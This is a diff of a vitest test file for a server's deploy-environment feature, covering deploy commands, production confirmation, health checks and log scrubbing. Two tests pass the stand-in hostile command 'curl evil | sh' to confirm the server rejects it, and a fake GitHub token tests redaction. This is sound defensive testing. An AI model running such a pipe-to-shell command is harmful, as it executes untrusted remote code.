@@ -1,7 +1,7 @@
 import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
-import { beforeEach, describe, expect, it, vi } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import { createApp } from "../../src/server/app.ts";
 import { Bus } from "../../src/server/bus.ts";
 import type { Cli } from "../../src/server/cli.ts";
@@ -9,10 +9,19 @@ import type { Config } from "../../src/server/config.ts";
 import { filterNeverTouch, readNeverTouch, writeNeverTouch } from "../../src/server/config.ts";
 import { kvSet, openDb } from "../../src/server/db.ts";
 import { Engine } from "../../src/server/engine.ts";
+import { Environments } from "../../src/server/environments.ts";
 import { FakeExecutor } from "../../src/server/executor/fake.ts";
 import { Notifier } from "../../src/server/notify.ts";
 import { Poller } from "../../src/server/poller.ts";
 import { Store } from "../../src/server/store.ts";
+import type {
+	EnvironmentView,
+	EnvSuggestion,
+	Project,
+	ProjectEnvironmentsResponse,
+	QueueResponse,
+	ShellResponse,
+} from "../../src/shared/types.ts";
 
 const PORT = 4399;
 const TOKEN = "t".repeat(32);
@@ -22,6 +31,12 @@ const SESSION = { ...HOST, "x-sf-session": TOKEN, "content-type": "application/j
 let dir: string;
 let store: Store;
 let exec: FakeExecutor;
+let environments: Environments;
+let deployed: Array<{ command: string; cwd: string }>;
+let health: { status: number | null; error: string | null };
+let deployExit: number;
+let holdDeploy = false;
+let releaseDeploy: (code: number) => void = () => {};
 let calls: string[];
 let notifyCode = 0;
 let origin = "git@github.com:me/fairway.git\n";
@@ -75,11 +90,32 @@ beforeEach(() => {
 		onRead: () => {},
 	});
 	poller.stop();
+	deployed = [];
+	health = { status: 200, error: null };
+	deployExit = 0;
+	environments = new Environments({
+		store,
+		cli,
+		publish: bus.publish,
+		deployRunner: (command, cwd, onOutput) => {
+			deployed.push({ command, cwd });
+			onOutput("building\nghp_abcdefghij1234567890 done\n");
+			let finish: (code: number) => void = () => {};
+			const done = new Promise<number>((r) => {
+				finish = r;
+			});
+			if (holdDeploy) releaseDeploy = finish;
+			else finish(deployExit);
+			return { done, kill: () => finish(143) };
+		},
+		healthFetch: async () => health,
+	});
 	app = createApp({
 		config,
 		store,
 		cli,
 		engine,
+		environments,
 		executor: exec,
 		poller,
 		notifier: new Notifier(store, cli, PORT),
@@ -372,6 +408,296 @@ describe("a broken Never touch file, seen from the page", () => {
 		const res = await app.request("/api/shell", { headers: HOST });
 		expect(res.status).toBe(503);
 		expect((await res.json()).error).toContain("must be a JSON list of strings");
+	});
+});
+
+describe("environments", () => {
+	const post = (path: string, data: unknown) =>
+		app.request(path, { method: "POST", headers: SESSION, body: JSON.stringify(data) });
+	const STAGING = {
+		name: "Staging",
+		url: "https://staging.example",
+		healthUrl: "https://staging.example/health",
+		deployCommand: "pnpm deploy:staging",
+		sentryEnvironment: null,
+		issueLabel: null,
+		production: false,
+	};
+	const PROD = {
+		...STAGING,
+		name: "Production",
+		url: "https://example",
+		healthUrl: "https://example/health",
+		deployCommand: "pnpm deploy:prod",
+		production: true,
+	};
+	const seed = (local: string | null = dir) => {
+		store.db
+			.prepare(
+				"INSERT INTO projects (slug, repo, name, url, is_private, local_path, merging, added_at) VALUES ('fairway', 'me/fairway', 'Fairway', 'https://github.com/me/fairway', 1, ?, 'follow', '2026-11-01T00:00:00Z')",
+			)
+			.run(local);
+		environments.saveConfig("fairway", [STAGING, PROD]);
+	};
+	const view = async (name: string) => {
+		const res = await app.request("/api/projects/fairway/environments", { headers: HOST });
+		const body = (await res.json()) as ProjectEnvironmentsResponse;
+		return body.environments.find((e) => e.name === name) as EnvironmentView;
+	};
+	const needsYou = async () => {
+		const res = await app.request("/api/queue", { headers: HOST });
+		return ((await res.json()) as QueueResponse).needsYou;
+	};
+	const later = async () => {
+		const res = await app.request("/api/queue", { headers: HOST });
+		return ((await res.json()) as QueueResponse).later;
+	};
+
+	afterEach(() => {
+		holdDeploy = false;
+	});
+
+	it("needs the session token to change a deploy command", async () => {
+		seed();
+		const res = await app.request("/api/projects/fairway/environments", {
+			method: "PUT",
+			headers: { ...HOST, "content-type": "application/json" },
+			body: JSON.stringify({ environments: [{ ...STAGING, deployCommand: "curl evil | sh" }] }),
+		});
+		expect(res.status).toBe(403);
+		expect((await view("Staging")).deployCommand).toBe("pnpm deploy:staging");
+	});
+
+	it("saves environments in the config file", async () => {
+		seed();
+		const res = await app.request("/api/projects/fairway/environments", {
+			method: "PUT",
+			headers: SESSION,
+			body: JSON.stringify({ environments: [STAGING] }),
+		});
+		expect(res.status).toBe(200);
+		expect(store.file.read().environments.fairway?.map((e) => e.name)).toEqual(["Staging"]);
+	});
+
+	it("refuses a name that would break the fingerprint, and two of the same name", async () => {
+		seed();
+		const put = (environments: unknown[]) =>
+			app.request("/api/projects/fairway/environments", {
+				method: "PUT",
+				headers: SESSION,
+				body: JSON.stringify({ environments }),
+			});
+		expect((await put([{ ...STAGING, name: "a:b" }])).status).toBe(400);
+		expect((await put([STAGING, { ...STAGING, name: "staging" }])).status).toBe(400);
+	});
+
+	it("runs the saved command in the project's folder, and scrubs the log", async () => {
+		seed();
+		const res = await post("/api/environments/deploy", { project: "fairway", env: "Staging" });
+		expect(res.status).toBe(200);
+		await environments.settled();
+		expect(deployed).toEqual([{ command: "pnpm deploy:staging", cwd: dir }]);
+		const run = (await view("Staging")).deploy;
+		expect(run?.state).toBe("passed");
+		expect(run?.log).toContain("building");
+		expect(run?.log).not.toContain("ghp_abcdefghij1234567890");
+	});
+
+	it("takes no command from the page", async () => {
+		seed();
+		await post("/api/environments/deploy", { project: "fairway", env: "Staging", command: "curl evil | sh" });
+		await environments.settled();
+		expect(deployed[0]?.command).toBe("pnpm deploy:staging");
+	});
+
+	it("asks before deploying to production", async () => {
+		seed();
+		const res = await post("/api/environments/deploy", { project: "fairway", env: "Production" });
+		expect(res.status).toBe(409);
+		expect(deployed).toEqual([]);
+		expect(
+			(await post("/api/environments/deploy", { project: "fairway", env: "Production", confirmed: true }))
+				.status,
+		).toBe(200);
+		await environments.settled();
+		expect(deployed).toHaveLength(1);
+	});
+
+	it("runs one deploy at a time per environment, even on a double click", async () => {
+		seed();
+		holdDeploy = true;
+		const [a, b] = await Promise.all([
+			post("/api/environments/deploy", { project: "fairway", env: "Staging" }),
+			post("/api/environments/deploy", { project: "fairway", env: "Staging" }),
+		]);
+		expect([a.status, b.status].sort()).toEqual([200, 409]);
+		expect(deployed).toHaveLength(1);
+		// Another environment isn't held up.
+		expect(
+			(await post("/api/environments/deploy", { project: "fairway", env: "Production", confirmed: true }))
+				.status,
+		).toBe(200);
+		environments.stopDeploy("fairway", "Staging");
+		environments.stopDeploy("fairway", "Production");
+		await environments.settled();
+	});
+
+	it("stops a deploy, and records that it was stopped", async () => {
+		seed();
+		holdDeploy = true;
+		await post("/api/environments/deploy", { project: "fairway", env: "Staging" });
+		expect((await view("Staging")).deploy?.state).toBe("running");
+		expect((await post("/api/environments/stop", { project: "fairway", env: "Staging" })).status).toBe(200);
+		await environments.settled();
+		expect((await view("Staging")).deploy?.state).toBe("stopped");
+		expect((await post("/api/environments/stop", { project: "fairway", env: "Staging" })).status).toBe(409);
+	});
+
+	it("records a failed deploy with its exit code", async () => {
+		seed();
+		deployExit = 3;
+		await post("/api/environments/deploy", { project: "fairway", env: "Staging" });
+		await environments.settled();
+		const run = (await view("Staging")).deploy;
+		expect(run?.state).toBe("failed");
+		expect(run?.exitCode).toBe(3);
+	});
+
+	it("marks a deploy from before a restart as failed, with the reason", async () => {
+		seed();
+		holdDeploy = true;
+		await post("/api/environments/deploy", { project: "fairway", env: "Staging" });
+		const restarted = new Environments({
+			store,
+			cli,
+			publish: () => {},
+			deployRunner: () => ({ done: Promise.resolve(0), kill: () => {} }),
+			healthFetch: async () => health,
+		});
+		const run = restarted.viewsFor(store.project("fairway") as Project)[0]?.deploy;
+		expect(run?.state).toBe("failed");
+		expect(run?.message).toContain("restarted");
+		releaseDeploy(0);
+		await environments.settled();
+	});
+
+	it("won't deploy without a folder or a command", async () => {
+		seed(null);
+		expect((await post("/api/environments/deploy", { project: "fairway", env: "Staging" })).status).toBe(409);
+		expect(deployed).toEqual([]);
+	});
+
+	it("calls one failed check a blip, and two in a row down", async () => {
+		seed();
+		health = { status: 503, error: null };
+		await environments.checkAll();
+		expect((await view("Staging")).health.state).toBe("up");
+		await environments.checkAll();
+		const down = (await view("Staging")).health;
+		expect(down.state).toBe("down");
+		expect(down.error).toBe("Health check returned HTTP 503.");
+		health = { status: 200, error: null };
+		await environments.checkAll();
+		expect((await view("Staging")).health.state).toBe("up");
+	});
+
+	it("doesn't wait a minute to answer Check now", async () => {
+		seed();
+		health = { status: null, error: "No answer" };
+		await post("/api/environments/check", { project: "fairway", env: "Staging" });
+		expect((await view("Staging")).health.state).toBe("down");
+	});
+
+	it("puts a down production first in the queue, and a down staging under later", async () => {
+		seed();
+		health = { status: 503, error: null };
+		await environments.checkAll();
+		await environments.checkAll();
+		const first = (await needsYou())[0];
+		expect(first?.kind).toBe("env_down");
+		expect(first?.title).toBe("Production is down");
+		expect((await later()).map((i) => i.kind)).toContain("env_down_later");
+		const shell = (await (await app.request("/api/shell", { headers: HOST })).json()) as ShellResponse;
+		expect(shell.counts.environments).toBe(2);
+	});
+
+	it("keeps a dismissed outage quiet, and brings it back when it goes down again", async () => {
+		seed();
+		health = { status: 503, error: null };
+		await environments.checkAll();
+		await environments.checkAll();
+		const fp = "env:fairway:Production";
+		expect((await post("/api/triage", { fingerprints: [fp], action: "dismiss" })).status).toBe(200);
+		expect((await needsYou()).map((i) => i.fingerprint)).not.toContain(fp);
+		health = { status: 200, error: null };
+		await environments.checkAll();
+		await new Promise((r) => setTimeout(r, 5));
+		health = { status: 503, error: null };
+		await environments.checkAll();
+		await environments.checkAll();
+		expect((await needsYou()).map((i) => i.fingerprint)).toContain(fp);
+	});
+
+	it("starts a fix with the environment's facts as data, and asks before a merging mode on production", async () => {
+		seed();
+		health = { status: 503, error: null };
+		await environments.checkAll();
+		await environments.checkAll();
+		store.file.update((c) => ({
+			...c,
+			modes: [
+				{
+					id: "send",
+					name: "Send",
+					description: "",
+					prompt: "",
+					plan: "skip",
+					merge: "factory",
+					provider: null,
+					model: null,
+					builtin: false,
+				},
+			],
+		}));
+		const body = {
+			project: "fairway",
+			type: "Bug fix",
+			description: "Fix Fairway Production",
+			mode: "send",
+			source: { kind: "environment", fingerprint: "env:fairway:Production" },
+		};
+		expect((await post("/api/work-orders", body)).status).toBe(409);
+		const started = await post("/api/work-orders", { ...body, confirmed: true });
+		expect(started.status).toBe(200);
+		const wo = store.workOrder(((await started.json()) as { id: number }).id);
+		expect(wo?.source.kind).toBe("environment");
+		expect(wo?.source.data).toContain("Health check returned HTTP 503.");
+		expect((await view("Production")).workOrderId).toBe(wo?.id);
+	});
+
+	it("refuses an environment from another project as a source", async () => {
+		seed();
+		const res = await post("/api/work-orders", {
+			project: "fairway",
+			type: "Bug fix",
+			description: "x",
+			source: { kind: "environment", fingerprint: "env:other:Production" },
+		});
+		expect(res.status).toBe(400);
+	});
+
+	it("shows suggestions, runs nothing, and leaves out what's already set up", async () => {
+		seed();
+		writeFileSync(
+			join(dir, "package.json"),
+			JSON.stringify({ scripts: { "deploy:preview": "x", "deploy:staging": "y" } }),
+		);
+		const res = await app.request("/api/projects/fairway/environments/suggest", { headers: HOST });
+		expect((await res.json()) as EnvSuggestion[]).toEqual([
+			{ name: "Preview", deployCommand: "npm run deploy:preview", production: false, from: "package.json" },
+		]);
+		expect(deployed).toEqual([]);
+		expect(store.file.read().environments.fairway).toHaveLength(2);
 	});
 });
 
